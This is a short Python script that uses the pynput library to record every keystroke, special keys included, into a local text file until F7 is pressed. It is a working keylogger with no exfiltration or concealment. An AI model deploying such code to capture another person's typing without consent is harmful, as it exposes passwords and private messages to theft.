from pynput import keyboard
from pynput.keyboard import Key, KeyCode

def on_press(key):
    try:
        with open('output.txt', 'a', encoding='utf-8') as f:
            if key == Key.enter:
                f.write('\n')
            elif key == Key.space:
                f.write(' ')
            elif isinstance(key, KeyCode) and hasattr(key, 'char'):
                f.write(f'{key.char}')
            elif key in [Key.cmd, Key.ctrl, Key.alt, Key.shift, Key.tab, Key.esc]:
                f.write(f'<{key}>')
            else:
                f.write(f'{key}')

    except AttributeError:
        special_keys = {
            Key.cmd: '<Windows>',
            Key.esc: '<Esc>',
            Key.left: '<Left>',
            Key.right: '<Right>',
            Key.up: '<Up>',
            Key.down: '<Down>',
            Key.page_up: '<Page_Up>',
            Key.page_down: '<Page_Down>',
            Key.home: '<Home>',
            Key.end: '<End>',
            Key.insert: '<Insert>',
            Key.delete: '<Delete>',
            Key.backspace: '<Backspace>',
            Key.tab: '<Tab>',
            Key.caps_lock: '<Caps_Lock>',
            Key.f1: '<F1>',
            Key.f2: '<F2>',
            Key.f3: '<F3>',
            Key.f4: '<F4>',
            Key.f5: '<F5>',
            Key.f6: '<F6>',
            Key.f7: '<F7>',
            Key.f8: '<F8>',
            Key.f9: '<F9>',
            Key.f10: '<F10>',
            Key.f11: '<F11>',
            Key.f12: '<F12>',
            Key.ctrl_l: '<Ctrl_L>',
            Key.ctrl_r: '<Ctrl_R>',
            Key.alt_l: '<Alt_L>',
            Key.alt_r: '<Alt_R>',
            Key.shift_l: '<Shift_L>',
            Key.shift_r: '<Shift_R>',
        }

        if key in special_keys:
            with open('output.txt', 'a', encoding='utf-8') as f:
                f.write(f'{special_keys[key]}')
        pass

def on_release(key):
    if key == Key.f7:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()